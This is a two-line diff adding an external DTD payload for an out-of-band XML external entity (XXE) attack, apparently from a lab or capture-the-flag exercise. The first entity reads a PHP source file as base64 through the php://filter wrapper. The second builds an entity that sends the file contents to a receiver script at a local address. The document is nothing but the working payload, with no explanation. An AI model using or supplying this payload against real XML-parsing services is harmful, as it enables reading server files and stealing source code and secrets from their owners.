@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=xxe1.php">
+<!ENTITY % send "<!ENTITY xxe SYSTEM 'http://127.0.0.1:9999/receiver.php?data=%file;'>">
